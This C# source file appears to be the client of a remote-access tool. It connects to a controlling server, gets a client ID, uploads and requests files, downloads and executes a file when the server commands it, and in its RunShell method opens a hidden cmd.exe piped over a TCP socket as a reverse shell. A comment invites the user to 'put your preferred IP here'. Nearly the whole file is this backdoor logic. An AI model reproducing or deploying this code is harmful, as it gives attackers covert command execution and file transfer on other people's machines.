using CommonLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientLibrary
{
    public class ClientTcp
    {
        private NetworkStream _netstream;
        private TcpClient _client;
        private CancellationTokenSource _token;
        private int _ID;
        private StreamWriter ShellWriter;
        private Process processCmd;
        private StringBuilder strInput;
        private Task handleRequest;

        public int myID
        {
            get
            {
                return this._ID;
            }
            private set
            {
                this._ID = value;
            }
        }

        private NetworkStream netStream
        {
            get
            {
                return this._netstream;
            }
            set
            {
                this._netstream = value;
            }
        }

        private TcpClient myClient
        {
            get
            {
                return this._client;
            }
            set
            {
                this._client = value;
            }
        }

        private CancellationTokenSource cToken
        {
            get
            {
                return this._token;
            }
            set
            {
                this._token = value;
            }
        }


        /// <summary>
        /// Ctor
        /// </summary>
        public ClientTcp()
        {
            this.myClient = null;
            this.netStream = null;
            this.cToken = null;
            this.myID = 0;
        }

        /// <summary>
        /// Connect to the server stream
        /// </summary>
        /// <param name="Host"></param>
        /// <param name="Port"></param>
        /// <returns></returns>
        public async Task Connect(string Host, int Port)
        {
            try
            {
                this.myClient = new TcpClient(Host, Port);
                this.netStream = this.myClient.GetStream();
                this.cToken = new CancellationTokenSource();
                cToken.Token.Register(() => this.myClient.Close());

                this.handleRequest = HandleClientRequest();

                await GetId();
                
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// Close the client stream
        /// </summary>
        public void DisConnect()
        {
            if (this.myClient != null && this.myClient.Connected)
            {
                this.cToken.Cancel();
                this.netStream.Close();
                this.myClient.Close();
            }
        }

        private async Task GetId()
        {
            if (this.myID != 0)
            { }
            else
            {
                string path = Directory.GetParent(System.Reflection.Assembly.GetExecutingAssembly().Location).FullName;
                string fileName = Path.Combine(path, "Id.text");

                //FileStream fs = new FileStream();
                if (!File.Exists(fileName))
                {
                    await AskForId();
                }

                else
                {
                    string myText = File.ReadAllText(fileName);

                    int fID;
                    if (int.TryParse(myText, out fID))
                    {
                        this.myID = fID;
                    }
                    else
                        await AskForId();

                }
            }
        }

        private async Task createIdFile(int Id)
        {
            string path = Directory.GetParent(System.Reflection.Assembly.GetExecutingAssembly().Location).FullName;
            string fileName = Path.Combine(path, "Id.text");

            // Create the file.
            using (FileStream fs = File.Create(fileName))
            {
                Byte[] info =
                    new UTF8Encoding(true).GetBytes(Id.ToString());

                // Add some information to the file.
                 await fs.WriteAsync(info, 0, info.Length);
            }

            this.myID = Id;
        }

        private async Task AskForId()
        {
            try
            {
                if (this.myClient.Connected)
                {
                    byte[] data = new byte[0];

                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.askClientID, 0, new byte[0], this.myID);

                    data = myMessage.serialize();

                    await this.netStream.WriteAsync(data, 0, data.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
            }
        }

        /// <summary>
        /// Ask file from the server
        /// </summary>
        /// <param name="FileName"></param>
        /// <returns></returns>
        public async Task AskFileFromServer(string FileName)
        {
            try
            {
                if (this.myClient.Connected)
                {
                    byte[] data = Encoding.ASCII.GetBytes(FileName);
                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.AskForFile, data.Length, data, this.myID);

                    data = myMessage.serialize();

                    await this.netStream.WriteAsync(data, 0, data.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
            }
        }

        /// <summary>
        /// Send file to the server
        /// </summary>
        /// <param name="FileName"></param>
        /// <returns></returns>
        public async Task ClientSendFile(string FileName)
        {
            byte[] SendingBuffer = null;
            try
            {
                if (this.myClient.Connected)
                {
                    List<byte> byteList = new List<byte>();
                    byte[] dataSend;

                    FileStream Fs = new FileStream(FileName, FileMode.Open, FileAccess.Read);
                    int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(1024)));
                    int TotalLength = (int)Fs.Length, CurrentPacketLength;

                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.DownloadAndExe, TotalLength, this.myID);

                    for (int i = 0; i < NoOfPackets; i++)
                    {
                        if (TotalLength > 1024)
                        {
                            CurrentPacketLength = 1024;
                            TotalLength = TotalLength - CurrentPacketLength;
                        }
                        else
                            CurrentPacketLength = TotalLength;
                        SendingBuffer = new byte[CurrentPacketLength];
                        await Fs.ReadAsync(SendingBuffer, 0, CurrentPacketLength);
                        byteList.AddRange(SendingBuffer);
                    }

                    Fs.Close();
                    myMessage.MyData = byteList.ToArray();

                    dataSend = myMessage.serialize();

                    await this.netStream.WriteAsync(dataSend, 0, dataSend.Length);
                    await this.netStream.FlushAsync();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// Handling requests from the clients
        /// </summary>
        /// <param name="FileName"></param>
        /// <param name="Host"></param>
        /// <param name="Port"></param>
        private async Task HandleClientRequest()
        {
            try
            {
                ServerClientMessage recivedMessage;

                while (!this.cToken.Token.IsCancellationRequested)
                {
                    recivedMessage = await TcpClass.GetMessageData(this.netStream);

                    if (!this.cToken.Token.IsCancellationRequested)
                    {
                        switch (recivedMessage.MyMessageType)
                        {
                            case MessageType.DownloadAndExe:
                                {
                                    string FileName = @"C:\Users\guy\Desktop\FileToSendFromServer\OpenNotepad++.bat";
                                    TcpClass.DownloadAndExeFile(recivedMessage, FileName);
                                    break;
                                }
                            case MessageType.RunShell:
                                {
                                    RunShell();
                                    break;
                                }
                            case MessageType.askClientID:
                                {

                                    break;
                                }
                            case MessageType.GetClientID:
                                {
                                    await createIdFile(recivedMessage.ID);
                                    break;
                                }
                            default:
                                {
                                    Console.WriteLine("Invalid message type");
                                    break;
                                }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                this.netStream.Close();
                this.myClient.Close();
            }
        }

        public async Task AskforShell()
        {
            try
            {
                if (this.myClient.Connected)
                {
                    byte[] data = new byte[0];
                    ServerClientMessage myMessage = new ServerClientMessage(MessageType.RunShell, data.Length, data, this.myID);

                    data = myMessage.serialize();

                    await this.netStream.WriteAsync(data, 0, data.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
            }
        }

        private async Task RunShell()
        {
            strInput = new StringBuilder();
            StreamReader ShellReader;
            if (this.myClient.Connected)
            {
                try
                {
                    TcpClient ShellClient = new TcpClient("127.0.0.1", 6666);
                    //put your preferred IP here
                    NetworkStream ShellStream = ShellClient.GetStream();
                    ShellReader = new StreamReader(ShellStream);
                    ShellWriter = new StreamWriter(ShellStream);
                }
                catch (Exception err) { return; } //if no Client don't 
                                                  //continue 
                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new
                DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();

                while (!this.cToken.IsCancellationRequested)
                {
                    try
                    {
                        strInput.Append(await ShellReader.ReadLineAsync());
                        strInput.Append("\n");
                        if (strInput.ToString().LastIndexOf(
                            "terminate") >= 0) StopServer();
                        if (strInput.ToString().LastIndexOf(
                            "exit") >= 0) throw new ArgumentException();
                        processCmd.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                    catch (Exception err)
                    {
                        Cleanup();
                        break;
                    }
                }
            }
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            ShellWriter.Close();
            netStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private async void CmdOutputDataHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    await ShellWriter.WriteLineAsync(strOutput.ToString());
                    await ShellWriter.FlushAsync();
                }
                catch (Exception err) { }
            }
        }
    }
}
